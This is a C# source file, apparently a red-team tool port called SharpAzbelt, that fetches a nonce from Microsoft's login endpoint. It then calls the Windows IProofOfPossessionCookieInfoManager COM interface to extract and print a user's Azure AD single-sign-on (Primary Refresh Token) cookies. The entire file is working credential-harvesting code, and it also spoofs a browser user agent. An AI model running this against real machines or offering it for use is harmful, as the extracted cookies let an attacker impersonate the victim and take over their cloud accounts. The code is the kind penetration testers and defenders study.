/*
 * based on https://github.com/daddycocoaman/azbelt/blob/main/src/azbelt/modules/sso.nim
 * which is based on https://github.com/leechristensen/RequestAADRefreshToken/blob/master/RequestAADRefreshToken/Program.cs
 * 
 * I've just bastardised the two.
 */
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Threading.Tasks;

namespace SharpAzbelt
{
    [StructLayout(LayoutKind.Sequential)]
    public class ProofOfPossessionCookieInfo
    {
        public string Name { get; set; }
        public string Data { get; set; }
        public uint Flags { get; set; }
        public string P3PHeader { get; set; }
    }

    public static class ProofOfPossessionCookieInfoManager
    {
        // All these are defined in the Win10 WDK
        [Guid("CDAECE56-4EDF-43DF-B113-88E4556FA1BB")]
        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        internal interface IProofOfPossessionCookieInfoManager
        {
            int GetCookieInfoForUri(
                [MarshalAs(UnmanagedType.LPWStr)] string Uri,
                out uint cookieInfoCount,
                out IntPtr output
            );
        }

        [Guid("A9927F85-A304-4390-8B23-A75F1C668600")]
        [ComImport]
        private class WindowsTokenProvider
        {
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UnsafeProofOfPossessionCookieInfo
        {
            public readonly IntPtr NameStr;
            public readonly IntPtr DataStr;
            public readonly uint Flags;
            public readonly IntPtr P3PHeaderStr;
        }
        public static IEnumerable<ProofOfPossessionCookieInfo> GetCookieInfoForUri(string uri)
        {
            var provider = (IProofOfPossessionCookieInfoManager)new WindowsTokenProvider();
            var res = provider.GetCookieInfoForUri(uri, out uint count, out var ptr);

            if (count <= 0)
                yield break;

            var offset = ptr;
            for (int i = 0; i < count; i++)
            {
                var info = (UnsafeProofOfPossessionCookieInfo)Marshal.PtrToStructure(offset, typeof(UnsafeProofOfPossessionCookieInfo));

                var name = Marshal.PtrToStringUni(info.NameStr);
                var data = Marshal.PtrToStringUni(info.DataStr);
                var flags = info.Flags;
                var p3pHeader = Marshal.PtrToStringUni(info.P3PHeaderStr);

                yield return new ProofOfPossessionCookieInfo()
                {
                    Name = name,
                    Data = data,
                    Flags = flags,
                    P3PHeader = p3pHeader
                };

                Marshal.FreeCoTaskMem(info.NameStr);
                Marshal.FreeCoTaskMem(info.DataStr);
                Marshal.FreeCoTaskMem(info.P3PHeaderStr);

                offset = (IntPtr)(offset.ToInt64() + Marshal.SizeOf(typeof(ProofOfPossessionCookieInfo)));
            }

            Marshal.FreeCoTaskMem(ptr);
        }
    }

    class Sso
    {
        private static readonly HttpClient client = new HttpClient();

        public static async Task<String> runSso()
        {
            string outText = "[i] SSO Cookie Info:\n";
            string outFormat = "[+]    {0,-25} : {1}\n";
            string loginUri = "https://login.microsoftonline.com/?sso_nonce=";

            // grab a nonce
            string response = await GetJsonFromPostHttp("https://login.microsoftonline.com/common/oauth2/v2.0/token", "grant_type=srv_challenge");

            var jsonObject = JsonNode.Parse(response).AsObject();
            string nonce = jsonObject["Nonce"].ToString();

            var cookies = ProofOfPossessionCookieInfoManager.GetCookieInfoForUri($"{loginUri}{nonce}").ToList();
            if (cookies.Any())
            {
                foreach (var cookie in cookies)
                {
                    outText += string.Format(outFormat, "URL", loginUri);
                    outText += string.Format(outFormat, "Name", cookie.Name);
                    outText += string.Format(outFormat, "Flags", cookie.Flags);
                    outText += string.Format(outFormat, "Data", cookie.Data);
                    outText += string.Format(outFormat, "P3PHeader", cookie.P3PHeader);
                }
            }
            else
            {
                outText += "[!]    No cookies obtained\n";
            }

            return outText + "\n";
        }

        private static async Task<String> GetJsonFromPostHttp(string Uri, string body)
        {
            string outText = "";
            try
            {
                // post request
                var msg = new HttpRequestMessage(HttpMethod.Post, Uri);
                //msg.Headers.Add("Host", msg.RequestUri.Host);
                // https://github.com/daddycocoaman/azbelt/blob/main/src/azbelt/modules/sso.nim#L44
                msg.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)");
                msg.Headers.Add("UA-CPU", "AMD64");

                msg.Content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded");

                var response = await client.SendAsync(msg);
                if (response.IsSuccessStatusCode)
                {
                    var jsonResponse = await response.Content.ReadAsStringAsync();
                    outText += jsonResponse + "\n";
                }
            }
            catch (Exception)
            {
                // do nowt
            }

            return outText;
        }
    }
}
